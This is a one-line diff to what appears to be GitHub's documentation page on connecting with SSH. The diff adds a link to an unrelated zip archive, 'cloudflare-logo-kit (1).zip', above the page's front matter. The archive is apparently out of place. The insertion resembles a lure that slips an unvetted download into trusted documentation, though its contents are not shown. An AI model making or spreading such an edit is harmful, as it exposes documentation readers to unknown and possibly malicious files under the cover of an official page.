@@ -1,3 +1,4 @@
+[cloudflare-logo-kit (1).zip](https://github.com/github/docs/files/8315404/cloudflare-logo-kit.1.zip)
 ---
 title: Connecting to GitHub with SSH
 intro: 'You can connect to {% data variables.product.product_name %} using the Secure Shell Protocol (SSH), which provides a secure channel over an unsecured network.'
